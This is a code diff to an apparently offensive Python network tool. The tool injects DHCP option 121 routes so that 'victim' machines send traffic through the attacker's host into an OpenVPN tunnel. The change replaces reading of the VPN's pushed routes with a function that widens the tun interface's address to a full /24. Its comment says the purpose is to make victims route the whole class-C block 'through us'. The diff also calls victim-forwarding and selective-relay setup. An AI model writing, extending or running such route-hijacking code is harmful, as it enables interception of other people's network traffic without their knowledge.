@@ -34,6 +34,7 @@ import atexit
 import glob
 import ipaddress
 import os
+import re
 import signal
 import subprocess
 import sys
@@ -198,46 +199,31 @@ def start_openvpn_if_needed():
 
 # ── VPN subnet extraction ─────────────────────────────────────────────────────
 
-def get_vpn_subnets(tun_iface):
+def get_tun_net24(tun_iface):
     """
-    Return the IPv4 CIDR prefixes routed via tun_iface.
+    Derive the /24 network covering the tun interface's assigned IP.
 
-    These are the subnets the VPN server pushed into the host routing table
-    (e.g. 10.8.0.0/24).  Default routes and non-routable ranges are excluded so
-    the injected option 121 stays as narrow as possible.
+    The VPN may assign a narrower prefix (e.g. /28) but we inject the full /24
+    so victims route the entire class-C block through us rather than just the
+    narrow slice the server happened to assign.
+
+      tun0 = 10.8.0.90/28  →  inject 10.8.0.0/24
     """
     try:
-        result = subprocess.run(
-            ["ip", "route", "show", "dev", tun_iface],
-            capture_output=True,
+        out = subprocess.check_output(
+            ["ip", "addr", "show", tun_iface],
             text=True,
-            check=False,
+            stderr=subprocess.DEVNULL,
         )
-    except FileNotFoundError:
-        print_step("WARN", "'ip' command not found — cannot read VPN subnets")
-        return []
-
-    subnets = []
-    for line in result.stdout.splitlines():
-        parts = line.split()
-        if not parts:
-            continue
-        prefix = parts[0]
-        if prefix in ("default", "0.0.0.0/0"):
-            continue
-        try:
-            net = ipaddress.IPv4Network(prefix, strict=False)
-        except ValueError:
-            continue
-        if net.is_link_local or net.is_loopback or net.is_multicast:
-            continue
-        subnets.append(str(net))
-
-    if subnets:
-        print_step("OK", f"VPN subnets via {tun_iface}: {subnets}")
-    else:
-        print_step("WARN", f"No routable subnets found via {tun_iface}")
-    return subnets
+        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/\d+", out)
+        if m:
+            net24 = str(ipaddress.IPv4Interface(f"{m.group(1)}/24").network)
+            print_step("OK", f"tun IP: {m.group(1)}  →  target subnet: {net24}")
+            return net24
+    except (subprocess.CalledProcessError, ValueError):
+        pass
+    print_step("WARN", f"Could not read IP from {tun_iface} — cannot derive /24 subnet")
+    return None
 
 
 # ── Option 121 policy on server_details ───────────────────────────────────────
@@ -329,14 +315,14 @@ def enable_vpn_relay(server_details, phys_iface):
         configure_passthrough(server_details)
         return None
 
-    vpn_subnets = get_vpn_subnets(tun)
-    if not vpn_subnets:
-        print_step("SKIP", "VPN up but no routable subnets — passthrough only")
+    vpn_net24 = get_tun_net24(tun)
+    if not vpn_net24:
+        print_step("SKIP", "VPN up but could not derive /24 subnet — passthrough only")
         configure_passthrough(server_details)
         return None
 
-    configure_selective_relay(server_details, vpn_subnets)
-    setup_victim_forwarding(phys_iface, tun, vpn_subnets)
+    configure_selective_relay(server_details, [vpn_net24])
+    setup_victim_forwarding(phys_iface, tun, [vpn_net24])
     return tun
 
 
